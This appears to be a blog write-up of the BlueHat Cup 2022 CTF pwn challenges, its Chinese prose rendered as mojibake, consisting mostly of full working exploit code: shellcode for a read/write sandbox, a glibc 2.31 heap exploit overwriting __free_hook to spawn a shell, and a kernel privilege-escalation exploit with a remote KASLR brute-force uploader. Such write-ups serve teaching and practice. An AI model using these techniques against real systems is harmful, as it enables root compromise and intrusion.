---
layout: article
pageview: true
key: 2022-07-12-bluehat2022-pwn-wp
title: è“å¸½æ¯2022Pwné¢˜WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

<!--more-->
## åˆèµ›

åˆèµ›åæ¬¡16åï¼Œè¿˜ç®—ä¸é”™

### EscapeShellcode

é¢˜ç›®å°†flagå†…å®¹è¯»åˆ°bssæ®µä¸Šåå°±å…³é—­äº†æ–‡ä»¶å¹¶ä¸”è¿›å…¥äº†æ²™ç›’ï¼Œæ²™ç›’ä¸­åªå…è®¸readå’Œwriteï¼ŒåŠ è½½æ²™ç›’åå°±å¯ä»¥æ‰§è¡Œè¾“å…¥åœ¨å †ä¸Šçš„shellcodeäº†ã€‚

æ‰§è¡Œshellcodeå‰ä¼šå°†é™¤äº†ripå¤–çš„æ‰€æœ‰å¯„å­˜å™¨è®¾ä¸º`0xdeadbeefdeadbeef`ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨`push pop call`ç­‰æ±‡ç¼–æŒ‡ä»¤ã€‚

ç”±äºå †åœ°å€å’Œbssæ®µåœ°å€åç§»èŒƒå›´ç›¸å¯¹å›ºå®šï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨`lea`æŒ‡ä»¤è·å–å½“å‰å †åœ°å€ï¼Œç„¶åå‘bssæ®µå¤§è‡´è·³è½¬ä¸€æ¬¡ï¼Œç„¶åè¾“å‡ºæ‰€åœ¨ä½ç½®çš„å†…å®¹ï¼Œå†å‘å‰è·³è½¬0x1000ï¼Œå¦‚æ­¤å¾ªç¯å¾€å¤ï¼Œå°±å¯ä»¥è¾“å‡ºbssæ®µä¸Šçš„flagå†…å®¹

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64')
context.log_level='debug'

_elf='./escape_shellcode'
_libc=''
_addr='47.94.194.27'
_port=43341

local=0

def getConn():
    if local==1:
        return process(_elf)
    else:
        return remote(_addr,_port)

def debug(p,cmd=None):
    if local==1:
        gdb.attach(p,cmd)
    pause()


p=getConn()
# pause()
debug(p,'b *$rebase(0x1367)')

shellcode="""
lea rbx, [rip-0xb1]
sub rbx,0x2a0
add rbx,0x120
sub rbx,0x100000

find_flag:
sub rbx,0x1000

print_flag:
mov rdi,1
xor rsi,rsi
add rsi,rbx
mov rdx,0x80
mov rax,1
syscall
jmp find_flag
"""

payload=asm(shellcode)
p.sendline(payload)
p.interactive()
#flag{9436fc2d-a75e-4da5-a4bd-71b6c9f6ef5d}
```

### Bank

é¢˜ç›®ç¯å¢ƒ`libc-2.31`ï¼Œå¯ä»¥æ³„éœ²ä»»æ„å †ä¸Šçš„å†…å®¹ï¼Œå¯ä»¥ä»»æ„freeåœ°å€ï¼Œæ¯æ¬¡å¯ç”³è¯·0x18å¤§å°çš„å †ï¼Œå¯ä»¥reallocå¤§å°å°äº0x100çš„å †ã€‚

æ¯æ¬¡æ“ä½œéœ€è¦èŠ±è´¹é’±ï¼Œæˆ‘ä»¬åˆå§‹æœ‰0x190çš„é’±ï¼Œéœ€è¦å­˜é’±åé€šè¿‡è½¬é’±æ¥æ“ä½œå †ï¼Œä¸è¿‡åœ¨å­˜é’±å–é’±çš„å‡½æ•°ä¸­å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œå¯ä»¥æ— é™åˆ·é’±ï¼Œè¿™æ ·å°±å¯ä»¥æ— é™å †æ“ä½œäº†ã€‚

åœ¨2.31ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨`fastbin doublefree&tcache stach`æ¥æ‰“free_hookã€‚

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64')
#context.log_level='debug'

_elf='./Bank'
_libc='./libc-2.31.so'
_addr='39.107.108.120'
_port=38779

local=0

def getConn():
    if local==1:
        return process(_elf)
    else:
        return remote(_addr,_port)

def debug(p,cmd=None):
    if local==1:
        gdb.attach(p,cmd)
    pause()

def cmd(idx):
    if idx==0:
        p.sendlineafter('Click: ','Quit')
    if idx==2:
        p.sendlineafter('Click: ','Deposit')
    if idx==3:
        p.sendlineafter('Click: ','Transfer')
    if idx==4:
        p.sendlineafter('Click: ','Put')
    if idx==5:
        p.sendlineafter('Click: ','Login')
    if idx==6:
        p.sendlineafter('Click: ','Info')

def deposit(num):
    cmd(2)
    p.sendlineafter('How Much? ',str(num))

def put(num):
    cmd(4)
    p.sendlineafter('How Much? ',str(num))

def info():
    cmd(6)

def login(card,pwd):
    cmd(5)
    p.sendlineafter('Card Numbers: ',str(card))
    p.sendlineafter('Password: ',str(pwd))

def t2admin(num):
    cmd(3)
    p.sendlineafter('who? ','admin')
    p.sendlineafter('How much? ',str(num))

def t2hacker(num,ptr):
    cmd(3)
    p.sendlineafter('who? ','hacker')
    p.sendlineafter('How much? ',str(num))
    p.sendlineafter('Great!',str(ptr))

def t2guest(num,data):
    cmd(3)
    p.sendlineafter('who? ','guest')
    p.sendlineafter('How much? ',str(num))
    p.sendafter('data: ',data)

def t2ghost(num,size):
    cmd(3)
    p.sendlineafter('who? ','ghost')
    p.sendlineafter('How much? ',str(num))
    p.sendlineafter(':)\n',str(size))

def t2abyss(num,data):
    cmd(3)
    p.sendlineafter('who? ','abyss')
    p.sendlineafter('How much? ',str(num))
    p.sendline(str(data))


libc=ELF(_libc)
p=getConn()
login(1111111111,111111)
put(0x190)
for i in range(0x10):
    deposit(0x190)
for i in range(0x10):
    put(0x190)


for i in range(0x10):
    t2guest(6,'a'*0x10)

t2ghost(0xa+1,0x20)
for i in range(0x20):
    t2guest(6,'b'*0x10)
t2ghost(0xa+1,0x30)
t2admin(0x4a-5)

p.recvuntil('I think ')
heap_addr=int(p.recv(14),16)
log.info(hex(heap_addr))

for i in range(7):
   t2hacker(0x33,heap_addr+0x2b0+0x20*i)

t2hacker(0x33,heap_addr+0x2b0+0x20*7)
t2hacker(0x33,heap_addr+0x2b0+0x20*8)
t2hacker(0x33,heap_addr+0x2b0+0x20*7)

for i in range(0x7):
    t2guest(6,'c'*0x10)

t2guest(6,p64(heap_addr+0x2b0+0x20*9-0x10))
t2guest(6,'c'*0x10)
t2guest(6,'c'*0x10)
t2guest(6,p64(0)+p64(0x431))

t2hacker(0x33, heap_addr+0x3d0)
t2admin(0x140/8)

p.recvuntil('I think ')
libc_base=int(p.recv(14),16)-libc.sym['__malloc_hook']-0x10-96
log.info(hex(libc_base))

t2guest(6,'/bin/sh\x00')

for i in range(7):
   t2hacker(0x33,heap_addr+0x2b0+0x20*i)

t2hacker(0x33,heap_addr+0x2b0+0x20*7)
t2hacker(0x33,heap_addr+0x2b0+0x20*8)
t2hacker(0x33,heap_addr+0x2b0+0x20*7)

for i in range(0x7):
    t2guest(6,'d'*0x10)
t2guest(6,p64(libc_base+libc.sym['__free_hook']))
t2guest(6,'d'*0x10)
t2guest(6,'d'*0x10)

t2guest(6,p64(libc_base+libc.sym['system']))

t2hacker(0x33,heap_addr+0x3d0)



p.interactive()

#flag{5ca01d35-f295-4813-9244-8588cb3c65bd}
```


## åŠå†³èµ›

åŠå†³èµ›å°±ä¸€é“`kernel pwn` ï¼Œå¾ˆå¿«æ‰¾åˆ°äº†åŸé¢˜ä¸º[2021è¥¿æ¹–è®ºå‰‘çº¿ä¸Šåˆèµ›easykernel](https://www.anquanke.com/post/id/260055) ï¼Œä¸åŸé¢˜çš„ä¸åŒç‚¹åœ¨äºæ²¡æœ‰è¯»å–åŠŸèƒ½ï¼Œä¸èƒ½è¯»åˆ°åç§»ï¼Œæˆ‘ä»¬å¯ä»¥çˆ†ç ´`kaslr`ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨[å®˜æ–¹é¢˜è§£](https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247494122&idx=1&sn=51a267183d85537169f27c777adf451c&chksm=c1d9a9b3f6ae20a5b573a3c74ff42b50bbbf2c5b3ae8235204fcb7f3c8f409cc71917a51edbf&mpshare=1&scene=23&srcid=08117PJk7f3Dm2d0NMbEAHWz&sharer_sharetime=1660212071120&sharer_shareid=6eb1075856cef58ed33fffda1397b380#rd)ä¸­çš„æ–¹å¼æ³„éœ²ã€‚

æ¯”èµ›æ—¶å€’æ˜¯çˆ†ç ´å‡ºäº†ä¸€æ¬¡ï¼Œåªä¸è¿‡å½“æ—¶å¿˜äº†è®¾ç½®çˆ†ç ´æˆåŠŸåç›´æ¥è¾“å‡ºflagï¼Œå¯¼è‡´120såå®¹å™¨é‡å¯äº†ï¼Œæ‚²ğŸ˜­ã€‚

åæ¥æœ¬åœ°çˆ†ç ´äº†å¤§æ¦‚ä¸€ä¸ªå°æ—¶ï¼Œ271æ¬¡å‡ºäº†ã€‚ã€‚ã€‚

### Smurf 

```c
#include <fcntl.h>
#include <stddef.h>
#include <stdlib.h>

#define COMMIT_CREDS 0xffffffff810c9540 
#define INIT_CRED 0xffffffff82a6b700 
#define POP_RDI_RET 0xffffffff8108c420 
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0 

long dev_fd;

struct op_chunk
{
    size_t  idx;
    size_t  size;
    void    *buf;
};

struct alloc_chunk
{
    size_t  size;
    void    *buf;
};


void writeChunk(size_t idx, size_t size, void *buf)
{
    struct op_chunk op = 
    {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x50, &op);
}

void deleteChunk(size_t idx)
{
    struct op_chunk op = 
    {
        .idx = idx,
    };
    ioctl(dev_fd, 0x30, &op);
}

void allocChunk(size_t size, void *buf)
{
    struct alloc_chunk alloc = 
    {
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x20, &alloc);
}

size_t      buf[0x100];
size_t      swapgs_restore_regs_and_return_to_usermode;
size_t      init_cred;
size_t      pop_rdi_ret;
long        seq_fd;
void *      kernel_base = 0xffffffff81000000;
size_t      kernel_offset = 0;
size_t      commit_creds;
size_t      gadget;

int main(int argc, char ** argv, char ** envp)
{
    dev_fd = open("/dev/kernelpwn", O_RDWR);

    allocChunk(0x20, buf);
    deleteChunk(0);
    seq_fd = open("/proc/self/stat", O_RDONLY);

    kernel_offset = (argv[1]) ? atoi(argv[1]) : 0;
    kernel_base += kernel_offset;
    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;
    init_cred = INIT_CRED + kernel_offset;
    pop_rdi_ret = POP_RDI_RET + kernel_offset;
    commit_creds = COMMIT_CREDS + kernel_offset;
    gadget = 0xffffffff81499087 + kernel_offset; 

    buf[0] = gadget;
    swapgs_restore_regs_and_return_to_usermode += 9;
    writeChunk(0, 0x8, buf);

    __asm__(
        "mov r15, 0xbeefdead;"
        "mov r14, pop_rdi_ret;"
        "mov r13, init_cred;" // add rsp, 0x40 ; ret
        "mov r12, commit_creds;"
        "mov rbp, swapgs_restore_regs_and_return_to_usermode;"
        "mov rbx, 0x999999999;"
        "mov r11, 0x114514;"
        "mov r10, 0x666666666;"
        "mov r9, 0x1919114514;"
        "mov r8, 0xabcd1919810;"
        "xor rax, rax;"
        "mov rcx, 0x666666;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, seq_fd;"
        "syscall"
    );

    system("/bin/sh");

    return 0;
}
```
çˆ†ç ´è„šæœ¬
```python
from pwn import *
import base64


with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())


try_count = 1
while True:
    log.info("no." + str(try_count) + " time(s)")
    p = remote("39.107.137.85", 15708)
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        # log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    randomization = (try_count % 1024) * 0x100000
    log.info('trying randomization: ' + hex(randomization))

    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit "+str(randomization))

    if not p.recvuntil(b"Rebooting in 1 seconds..", timeout=20):
        break
    log.warn('failed!')
    try_count += 1
    p.close()

context.log_level = "debug"
p.sendline("cat flag")
p.interactive()
```